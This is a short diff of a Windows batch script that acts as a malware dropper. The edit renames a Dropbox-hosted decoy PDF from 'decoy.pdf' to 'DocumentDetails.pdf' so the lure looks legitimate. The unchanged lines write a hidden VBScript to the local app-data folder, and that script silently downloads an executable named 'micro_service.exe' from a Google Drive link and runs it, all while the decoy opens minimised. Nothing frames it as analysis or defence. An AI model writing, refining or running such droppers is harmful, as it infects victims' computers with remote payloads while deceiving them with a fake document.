@@ -1,4 +1,4 @@
-start "" /min "https://www.dropbox.com/scl/fi/wzo8gx16236hk4quqrvo0/decoy.pdf?rlkey=0d7mzierq005gojj72aaykx85&st=p5t2rjie&dl=0"
+start "" /min "https://www.dropbox.com/scl/fi/wzo8gx16236hk4quqrvo0/DocumentDetails.pdf?rlkey=0d7mzierq005gojj72aaykx85&st=83fwkk1x&dl=0"
 echo CreateObject("WScript.Shell").Run "cmd /c curl -L -o ""%LOCALAPPDATA%\micro_service.exe"" ""https://drive.google.com/uc?export=download&id=1NR2WcsT5uj5fyeNf5PecY9SxnHY9S0as"" && ""%LOCALAPPDATA%\micro_service.exe""", 0, False > "%LOCALAPPDATA%\config.vbs"
 start "" /min  "%LOCALAPPDATA%\config.vbs"
 
